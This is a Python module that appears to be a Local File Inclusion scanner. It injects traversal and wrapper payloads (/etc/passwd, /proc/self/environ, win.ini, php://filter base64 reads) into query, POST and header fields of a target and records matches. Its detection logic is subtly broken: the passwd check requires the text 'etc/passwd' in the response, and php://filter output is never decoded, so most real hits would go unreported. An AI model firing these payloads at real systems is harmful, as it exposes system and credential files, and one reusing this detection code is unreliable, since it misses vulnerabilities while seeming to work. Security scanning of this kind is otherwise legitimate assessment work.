"""
lfi.py
------
Local File Inclusion detection helpers.

Features:
- Test common LFI payloads against a target endpoint and parameter
- Support different parameter injection points (query, body, headers)
- Collect evidence (snippet, status_code, matched_path) for reporting
- Provide heuristics for likely LFI (presence of /etc/passwd, typical Windows file markers)
- Respect timeouts and avoid raising exceptions to caller
"""

import requests
from typing import List, Dict, Optional
import logging

logger = logging.getLogger(__name__)

COMMON_LFI_PAYLOADS = [
    "/etc/passwd",
    "../../../../../../etc/passwd",
    "../../../../../etc/passwd",
    "/proc/self/environ",
    "../../../../../../../../../../../../etc/passwd",
    "C:\\boot.ini",
    "..\\..\\..\\..\\windows\\win.ini",
    "file:///etc/passwd",
    "php://filter/convert.base64-encode/resource=index.php"
]

class LFIScanner:
    def __init__(self, base_url: str, timeout: int = 8, user_agent: Optional[str] = None):
        self.base_url = base_url.rstrip("/")
        self.timeout = timeout
        self.user_agent = user_agent or "WebScanner-LFI/1.0"
        self.findings: List[Dict] = []

    def _request(self, method: str, url: str, **kwargs) -> Optional[requests.Response]:
        headers = kwargs.pop("headers", {})
        headers.setdefault("User-Agent", self.user_agent)
        try:
            resp = requests.request(method, url, headers=headers, timeout=self.timeout, **kwargs)
            return resp
        except requests.RequestException as e:
            logger.debug("Request error for %s: %s", url, e)
            return None

    def test_query_param(self, endpoint: str, param: str):
        """
        Test LFI payloads by injecting into a query parameter.
        Example: /download?file=<payload>
        """
        for p in COMMON_LFI_PAYLOADS:
            url = f"{self.base_url}{endpoint}"
            params = {param: p}
            resp = self._request("GET", url, params=params)
            if not resp:
                continue
            body = resp.text or ""
            if self._fingerprint(body):
                self.findings.append({
                    "type": "LFI",
                    "endpoint": endpoint,
                    "injection": "query",
                    "param": param,
                    "payload": p,
                    "status_code": resp.status_code,
                    "evidence_snippet": body[:800]
                })

    def test_post_field(self, endpoint: str, field: str):
        """
        Test LFI payloads by injecting into a POST form field.
        """
        for p in COMMON_LFI_PAYLOADS:
            url = f"{self.base_url}{endpoint}"
            data = {field: p}
            resp = self._request("POST", url, data=data)
            if not resp:
                continue
            body = resp.text or ""
            if self._fingerprint(body):
                self.findings.append({
                    "type": "LFI",
                    "endpoint": endpoint,
                    "injection": "body",
                    "field": field,
                    "payload": p,
                    "status_code": resp.status_code,
                    "evidence_snippet": body[:800]
                })

    def test_header_injection(self, endpoint: str, header_name: str):
        """
        Some LFI vectors may be triggered by custom headers (rare).
        """
        for p in COMMON_LFI_PAYLOADS:
            url = f"{self.base_url}{endpoint}"
            headers = {header_name: p}
            resp = self._request("GET", url, headers=headers)
            if not resp:
                continue
            body = resp.text or ""
            if self._fingerprint(body):
                self.findings.append({
                    "type": "LFI",
                    "endpoint": endpoint,
                    "injection": "header",
                    "header": header_name,
                    "payload": p,
                    "status_code": resp.status_code,
                    "evidence_snippet": body[:800]
                })

    def _fingerprint(self, body: str) -> bool:
        """
        Heuristic checks for LFI responses:
        - Unix /etc/passwd markers
        - Windows INI markers
        - php://filter base64 decoded content markers (presence of PHP code, <?php)
        """
        low = body.lower()
        if "root:x:" in low and "etc/passwd" in low:
            return True
        if "[extensions]" in low or "boot loader" in low or "win.ini" in low:
            return True
        if "<?php" in body or "phpinfo()" in low:
            return True
        return False

    def run(self) -> List[Dict]:
        return self.findings
